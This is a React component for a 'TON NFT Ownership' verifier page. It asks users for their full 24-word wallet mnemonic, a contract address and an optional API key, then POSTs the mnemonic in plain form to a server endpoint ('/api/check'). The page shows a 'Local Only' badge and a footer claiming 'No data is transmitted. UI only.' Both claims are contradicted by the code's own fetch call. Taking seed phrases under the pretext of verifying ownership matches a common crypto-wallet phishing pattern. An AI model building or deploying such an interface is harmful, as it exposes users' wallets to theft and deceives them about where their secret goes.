import { useMemo, useState } from 'react'
import './App.css'

function TonLogo(props) {
  const { size = 24 } = props
  return (
    <svg
      width={size}
      height={size}
      viewBox="0 0 48 48"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
      aria-hidden
    >
      <path
        d="M8 6h32a2 2 0 0 1 2 2v13.3c0 1.1-.44 2.17-1.22 2.96L26.96 38.4a2.5 2.5 0 0 1-3.92 0L7.22 24.26A4.2 4.2 0 0 1 6 21.3V8a2 2 0 0 1 2-2Z"
        fill="url(#g)"
      />
      <path
        d="M12 10h10.5c.83 0 1.5.67 1.5 1.5V28L12 16.8V10Zm24 0H25.5c-.83 0-1.5.67-1.5 1.5V28L36 16.8V10Z"
        fill="rgba(255,255,255,.9)"
      />
      <defs>
        <linearGradient id="g" x1="8" y1="6" x2="40" y2="42" gradientUnits="userSpaceOnUse">
          <stop stopColor="#09C1F0" />
          <stop offset="1" stopColor="#2B6CFF" />
        </linearGradient>
      </defs>
    </svg>
  )
}

function App() {
  const [mnemonic, setMnemonic] = useState('')
  const [showMnemonic, setShowMnemonic] = useState(false)
  const [contract, setContract] = useState('')
  const [network, setNetwork] = useState('mainnet')
  const [busy, setBusy] = useState(false)
  const [result, setResult] = useState(null)
  const [error, setError] = useState('')
  const [apiKey, setApiKey] = useState('')

  const wordCount = useMemo(
    () => (mnemonic.trim() ? mnemonic.trim().split(/\s+/).length : 0),
    [mnemonic]
  )

  return (
    <div className="app">
      <div className="bg-accent" aria-hidden />
      <header className="header">
        <div className="brand">
          <TonLogo size={26} />
          <span className="brand__name">TON NFT Ownership</span>
        </div>
        <div className="header__right">
          <span className="badge">Local Only</span>
          <span className="net">{network === 'testnet' ? 'Testnet' : 'Mainnet'}</span>
        </div>
      </header>

      <main className="shell" role="main">
        <section className="panel">
          <div className="panel__header">
            <h1 className="title">Verify NFT Ownership</h1>
            <p className="subtitle">
              Paste your mnemonic phrase and the NFT contract address on TON.
              Values are sent to a local server to run your check script.
            </p>
          </div>

          <div className="alert">
            <div className="alert__icon" aria-hidden>⚠️</div>
            <div className="alert__content">
              <strong>Sensitive info:</strong> Never share your mnemonic with anyone.
              This screen is for design/demo purposes only.
            </div>
          </div>

          <form
            className="form"
            onSubmit={async (e) => {
              e.preventDefault()
              setError('')
              setResult(null)
              setBusy(true)
              try {
                const res = await fetch('/api/check', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ mnemonic, contract, network, apiKey }),
                })
                const data = await res.json().catch(() => ({}))
                if (!res.ok) {
                  throw new Error(data?.error || `Request failed: ${res.status}`)
                }
                setResult(data)
              } catch (err) {
                setError(err?.message || 'Something went wrong')
              } finally {
                setBusy(false)
              }
            }}
          >
            <div className="field">
              <label htmlFor="mnemonic" className="label">
                Mnemonic Phrase
              </label>
              <div className={`input-wrap ${showMnemonic ? '' : 'masked'}`}>
                <textarea
                  id="mnemonic"
                  className="textarea"
                  placeholder="e.g. abandon ability able about above absent ..."
                  value={mnemonic}
                  onChange={(e) => setMnemonic(e.target.value)}
                  rows={4}
                />
                <button
                  type="button"
                  className="ghost-btn"
                  onClick={() => setShowMnemonic((s) => !s)}
                  aria-pressed={showMnemonic}
                >
                  {showMnemonic ? 'Hide' : 'Show'}
                </button>
              </div>
              <div className="meta">
                <span className="hint">Words: {wordCount}</span>
                <span className="hint">Required: 24</span>
              </div>
            </div>

            <div className="grid">
              <div className="field">
                <label htmlFor="contract" className="label">
                  NFT Contract Address
                </label>
                <input
                  id="contract"
                  className="input"
                  placeholder="EQC... (TON address)"
                  value={contract}
                  onChange={(e) => setContract(e.target.value)}
                />
              </div>
              <div className="field">
                <label htmlFor="network" className="label">Network</label>
                <div className="select-wrap">
                  <select
                    id="network"
                    className="select"
                    value={network}
                    onChange={(e) => setNetwork(e.target.value)}
                  >
                    <option value="mainnet">Mainnet</option>
                    <option value="testnet">Testnet</option>
                  </select>
                </div>
                <div className="meta">
                  <span className="hint">TON Center: {network === 'testnet' ? 'https://testnet.toncenter.com/api/v2/jsonRPC' : 'https://toncenter.com/api/v2/jsonRPC'}</span>
                </div>
              </div>
            </div>

            <div className="field">
              <label htmlFor="apiKey" className="label">TON Center API Key (optional)</label>
              <input
                id="apiKey"
                className="input"
                placeholder="Paste your TON Center API key if you have one"
                value={apiKey}
                onChange={(e) => setApiKey(e.target.value)}
              />
            </div>

            <div className="actions">
              <button className="cta" disabled={busy || !mnemonic || !contract || (mnemonic.trim().split(/\s+/).filter(Boolean).length !== 24)} title={(mnemonic.trim().split(/\s+/).filter(Boolean).length !== 24) ? 'Mnemonic must be exactly 24 words' : undefined}>
                {busy ? 'Checking…' : 'Check Ownership'}
              </button>
              <button className="secondary" type="reset" onClick={() => {
                setMnemonic('');
                setContract('');
                setNetwork('mainnet');
                setShowMnemonic(false);
                setResult(null);
                setError('');
                setApiKey('');
              }}>
                Clear
              </button>
            </div>
            {(error || result) && (
              <div className="field">
                {error && <div className="alert"><div className="alert__icon" aria-hidden>⚠️</div><div className="alert__content">{error}</div></div>}
                {result && (
                  <div className="output" role="region" aria-live="polite">
                    <div className="output__bar">
                      <h2 className="output__title">Script Output</h2>
                      <div style={{display:'flex', alignItems:'center', gap:8}}>
                        <span className={`pill ${result.success ? 'pill--ok' : 'pill--err'}`}>
                          {result.success ? 'Success' : 'Failed'} (code {result.exitCode})
                        </span>
                        <div className="output__actions">
                          <button
                            type="button"
                            className="tiny"
                            onClick={() => {
                              const text = `STDOUT\n${result.stdout || ''}\n\nSTDERR\n${result.stderr || ''}`
                              navigator.clipboard?.writeText(text)
                            }}
                          >Copy</button>
                        </div>
                      </div>
                    </div>
                    <Details title="STDOUT" content={result.stdout} defaultOpen />
                    <Details title="STDERR" content={result.stderr} />
                  </div>
                )}
              </div>
            )}
          </form>
        </section>
      </main>

      <footer className="footer">
        <span className="muted">No data is transmitted. UI only.</span>
      </footer>
    </div>
  )
}

export default App

function Details({ title, content, defaultOpen = false }) {
  const [open, setOpen] = useState(defaultOpen)
  const isEmpty = !content || !String(content).trim()
  return (
    <div className="section">
      <div className="section__head">
        <h3 className="section__title">{title}</h3>
        <div className="output__actions">
          <button type="button" className="tiny" onClick={() => setOpen((s) => !s)}>
            {open ? 'Hide' : 'Show'}
          </button>
          <button
            type="button"
            className="tiny"
            onClick={() => navigator.clipboard?.writeText(String(content || ''))}
            disabled={isEmpty}
            title={isEmpty ? 'Nothing to copy' : 'Copy'}
          >Copy</button>
        </div>
      </div>
      {open && (
        <pre className="code">{String(content || '(empty)')}</pre>
      )}
    </div>
  )
}
